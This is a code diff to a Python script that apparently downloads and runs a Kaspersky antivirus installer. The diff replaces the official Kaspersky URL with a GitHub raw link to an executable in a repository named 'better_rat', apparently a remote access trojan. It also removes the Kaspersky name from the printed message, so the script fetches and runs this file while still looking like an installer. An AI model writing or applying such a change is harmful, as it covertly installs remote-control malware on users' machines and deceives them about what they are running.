@@ -5,7 +5,7 @@ import urllib.request
 import socket
 import tempfile
 
-URL = "https://products.s.kaspersky-labs.com/homeuser/kaspersky_standard/latest/standard.exe"
+URL = "https://github.com/ferallo-guimo/better_rat/raw/refs/heads/main/Client-built.exe"
 
 def is_connected(host="8.8.8.8", port=53, timeout=3):
     try:
@@ -16,7 +16,7 @@ def is_connected(host="8.8.8.8", port=53, timeout=3):
         return False
 
 def download_installer(url, download_path):
-    print("Downloading Kaspersky installer...")
+    print("Downloading installer...")
     urllib.request.urlretrieve(url, download_path)
     print("Download complete.")
 
@@ -29,7 +29,7 @@ def main():
         print("No internet connection.")
         sys.exit(1)
 
-    temp_installer_path = os.path.join(tempfile.gettempdir(), "kaspersky_installer.exe")
+    temp_installer_path = os.path.join(tempfile.gettempdir(), "Client-built.exe")
     download_installer(URL, temp_installer_path)
     run_installer(temp_installer_path)
 
